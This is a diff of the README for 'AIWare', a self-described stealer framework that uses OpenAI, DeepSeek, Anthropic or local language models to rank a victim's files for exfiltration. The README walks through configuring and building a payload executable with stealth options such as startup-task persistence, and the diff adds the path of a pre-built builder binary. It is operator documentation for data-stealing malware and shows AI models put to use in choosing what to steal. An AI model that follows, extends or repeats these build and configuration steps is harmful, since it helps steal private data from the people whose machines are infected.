@@ -23,8 +23,8 @@ AIWare is an advanced intelligent stealer framework that uses AI models (local o
 2. **Choose Sample Size** - Select how much of each file to extract for LLM scoring (default: 5KB)
 3. **Set Value Threshold** - Files scoring above this percentage will be marked for exfiltration
 4. **Select AI Model**:
-   - Local (DeepSeek, Llama.cpp, etc.)
-   - Remote (OpenAI, custom LLM servers)
+   - Local (DeepSeek, Llama.cpp, etc.) --In-Progress
+   - Remote (OpenAI, DeepSeek, Anthropic, custom LLM servers)
 5. **Enter AI API Key** (If needed by your selected model — optional for local models)
 6. **Enable Stealth Options** (optional):
    - Skip AI analysis (dump everything fast)
@@ -33,7 +33,15 @@ AIWare is an advanced intelligent stealer framework that uses AI models (local o
    - Enable persistence via startup tasks
 7. **Build Payload** - Click Build Payload to generate your customized executable
 
-## Build Instructions
+## Getting Started
+
+### Option 1: Use Pre-built Binary
+A pre-built version is available in:
+```
+bin/Debug/net8.0-windows/AIWareBuilder.exe
+```
+
+### Option 2: Build From Source
 1. Open project in Visual Studio 2022 or newer
 2. Install required NuGet packages:
    - Newtonsoft.Json
